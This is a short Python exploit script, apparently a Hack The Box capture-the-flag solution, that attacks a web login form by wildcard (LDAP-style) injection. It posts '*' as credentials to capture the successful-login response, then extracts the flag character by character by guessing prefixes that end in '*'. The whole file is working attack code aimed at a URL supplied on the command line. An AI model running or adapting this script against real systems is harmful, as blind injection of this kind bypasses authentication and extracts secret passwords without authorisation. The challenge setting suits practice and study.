import requests
import string
import sys

try:
	url = sys.argv[1].strip()
except IndexError:
	print("[-] Usage: %s <url:port>/login " % sys.argv[0])
	sys.exit(-1)


# Identify success auth
auth_ok = requests.post(url + '/login', data={'username': '*', 'password': '*'})
password = "HTB{d1rectory_h4xx"
payload = string.ascii_letters + string.digits + (string.punctuation).replace('*', '')

while True: 
	for c in payload:
		sys.stdout.write(f"\r[+] Password: {password}{c}")
		login = requests.post(url + '/login', data={'username': '*', 'password': f'{password}{c}*'})
		if auth_ok.text == login.text:			
			password += c
			break
	if password[-1] == '}':
		print("Password completed")
		break	
		
